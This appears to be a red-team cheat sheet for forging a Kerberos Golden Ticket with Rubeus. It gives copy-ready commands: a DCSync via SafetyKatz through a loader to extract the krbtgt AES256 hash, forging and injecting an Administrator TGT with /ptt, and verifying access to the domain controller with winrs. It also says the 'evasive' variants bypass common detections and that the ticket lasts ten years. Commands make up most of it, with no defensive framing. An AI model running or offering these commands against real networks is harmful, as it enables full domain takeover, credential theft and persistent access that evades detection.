# Golden Ticket (Rubeus)

Forge a TGT using the krbtgt AES256 hash with `/ptt` injection. Grants persistent domain access.

## Prerequisites
- krbtgt AES256 hash
- Domain SID

## Forge and Inject
```
Loader.exe -path Rubeus.exe -args evasive-golden /aes256:<krbtgt_aes256> /sid:<domain_sid> /ldap /user:Administrator /ptt
```

- `/ldap` — pulls group info from LDAP to build PAC
- `/ptt` — injects directly into current session
- Use `/createnetonly:cmd.exe /show` to spawn a new process instead of injecting

## Get krbtgt Hash (DCSync)
```
Loader.exe -path SafetyKatz.exe -args "lsadump::evasive-dcsync /user:<domain>\krbtgt /domain:<DOMAIN>" "exit"
```

## Verify
```
winrs -r:<DC> cmd /c set username
```
Should return `USERNAME=administrator`.

## Notes
- Valid for 10 years by default
- Works cross-domain if krbtgt from target domain used
- `evasive-golden` variant bypasses common detections vs `golden`
